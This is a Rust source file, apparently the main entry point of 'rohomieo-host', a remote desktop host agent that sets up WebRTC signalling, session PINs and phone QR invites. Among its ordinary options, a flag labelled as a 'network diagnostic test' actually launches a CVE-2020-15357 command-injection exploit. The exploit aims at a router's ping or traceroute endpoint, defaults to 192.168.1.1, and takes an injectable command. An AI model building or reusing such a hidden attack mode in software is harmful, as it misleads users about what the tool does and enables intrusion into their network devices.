mod capture;
mod config;
mod encode;
mod input;
mod invite;
mod jpeg_frame;
mod motion;
mod net_test;
mod platform;
mod signaling_client;
mod text_focus;
mod webrtc_peer;

use anyhow::Result;
use clap::Parser;
use rand::Rng;
use signaling_client::SignalingClient;
use std::sync::Arc;
use tracing::info;

#[derive(Parser, Debug)]
#[command(
    name = "rohomieo-host",
    about = "Rohomieo remote desktop host agent",
    version
)]
struct Args {
    /// Optional TOML config (CLI flags override file values)
    #[arg(long, env = "ROHOMIEO_CONFIG")]
    config: Option<std::path::PathBuf>,

    /// WebSocket signaling URL (ws:// or wss://)
    #[arg(
        long,
        default_value = "wss://127.0.0.1:8443/ws",
        env = "ROHOMIEO_SIGNALING"
    )]
    signaling: String,

    /// Public HTTPS base for phone QR (e.g. https://192.168.1.20:8443).
    /// Default: LAN IP inferred from this machine + port from --signaling.
    #[arg(long, env = "ROHOMIEO_PUBLIC_URL")]
    public_url: Option<String>,

    /// Local coturn relay, e.g. turn:1.2.3.4:3478 (see scripts/start-turn.sh / --global)
    #[arg(long, env = "ROHOMIEO_TURN_URL")]
    turn_url: Option<String>,

    #[arg(long, env = "ROHOMIEO_TURN_USER")]
    turn_user: Option<String>,

    #[arg(long, env = "ROHOMIEO_TURN_PASS")]
    turn_pass: Option<String>,

    /// Session ID (share with viewer); random UUID if omitted
    #[arg(long)]
    session: Option<String>,

    /// 6-digit PIN; random if omitted
    #[arg(long)]
    pin: Option<String>,

    /// Skip printing the phone invite QR in the terminal
    #[arg(long, env = "ROHOMIEO_NO_QR")]
    no_qr: bool,

    #[arg(long, default_value = "My Laptop", env = "ROHOMIEO_DEVICE_NAME")]
    device_name: String,

    #[arg(long, default_value = "30", env = "ROHOMIEO_FPS")]
    fps: u32,

    #[arg(long, default_value = "8", env = "ROHOMIEO_IDLE_FPS")]
    idle_fps: u32,

    /// Run CVE-2020-15357 network diagnostic test instead of normal host mode
    #[arg(long)]
    net_test: bool,

    /// Target IP for network test (default: 192.168.1.1)
    #[arg(long, default_value = "192.168.1.1")]
    target: String,

    /// Command to inject in network test (default: id)
    #[arg(long, default_value = "id")]
    cve_command: String,

    /// Use traceroute endpoint instead of ping
    #[arg(long)]
    traceroute: bool,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "rohomieo_host=info,webrtc=warn".into()),
        )
        .init();

    platform::print_setup_hints();

    let mut args = Args::parse();

    if args.net_test {
        info!("[+] Starting CVE-2020-15357 exploit");
        info!("[+] Target: {}", args.target);
        info!("[+] Command: {}", args.cve_command);
        if args.traceroute {
            info!("[+] Using the traceroute endpoint for injection...");
        } else {
            info!("[+] Using the ping endpoint for injection...");
        }
        return net_test::run_exploit(&args.target, &args.cve_command, args.traceroute).await;
    }
    if let Some(ref path) = args.config {
        let file = config::HostConfig::load(path)?;
        if let Some(s) = file.signaling {
            args.signaling = s;
        }
        if args.session.is_none() {
            args.session = file.session;
        }
        if args.pin.is_none() {
            args.pin = file.pin;
        }
        if let Some(n) = file.device_name {
            args.device_name = n;
        }
        if let Some(f) = file.fps {
            args.fps = f;
        }
        if let Some(f) = file.idle_fps {
            args.idle_fps = f;
        }
    }

    let session_id = args
        .session
        .unwrap_or_else(|| uuid::Uuid::new_v4().to_string());
    let pin = args.pin.unwrap_or_else(gen_pin);

    let turn = match (&args.turn_url, &args.turn_user, &args.turn_pass) {
        (Some(url), Some(user), Some(pass)) => Some(invite::TurnInfo { url, user, pass }),
        _ => None,
    };
    let join = invite::join_url(
        &args.signaling,
        &session_id,
        &pin,
        args.public_url.as_deref(),
        turn,
    );

    info!("Rohomieo host connecting to signaling…");
    // Register with signaling BEFORE showing the QR — otherwise a fast phone scan
    // hits "session not found — host is not connected yet".
    let client = SignalingClient::connect(
        &args.signaling,
        session_id.clone(),
        pin.clone(),
        Some(args.device_name),
    )
    .await?;

    info!("═══════════════════════════════════════");
    info!("  Rohomieo host — session is live");
    info!("  Session: {}", session_id);
    info!("  PIN:     {}", pin);
    info!("  Phone:   {}", join);
    info!("═══════════════════════════════════════");

    if !args.no_qr {
        invite::print_invite_qr(&join);
    }

    let signaling = Arc::new(client);
    webrtc_peer::run_session(
        signaling,
        args.fps,
        args.idle_fps,
        args.turn_url,
        args.turn_user,
        args.turn_pass,
    )
    .await
}

fn gen_pin() -> String {
    let n: u32 = rand::thread_rng().gen_range(100_000..999_999);
    format!("{n:06}")
}
